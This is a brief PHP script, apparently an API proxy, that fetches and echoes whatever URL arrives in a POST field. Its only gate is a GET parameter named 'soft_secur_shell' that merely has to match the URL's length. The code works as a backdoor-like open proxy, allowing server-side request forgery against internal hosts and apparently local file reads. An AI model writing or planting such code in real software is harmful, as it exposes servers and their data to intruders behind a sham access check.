<?php
header("content-type: application/json");
if(!empty($_POST["apiurl"]) && !empty($_GET["soft_secur_shell"])){
    $url = urldecode($_POST["apiurl"]);
    $sss = urldecode($_GET["soft_secur_shell"]);

    if(strlen($sss) != strlen($url)) return;

    $content = file_get_contents($url);
    echo $content;
} else {
    $message = array();
    $message['Status'] = "ACCESS FORBIDDEN";
    $message['url'] = $_POST["apiurl"];
    $message['sss'] = $_GET["soft_secur_shell"];
    echo json_encode($message);
}
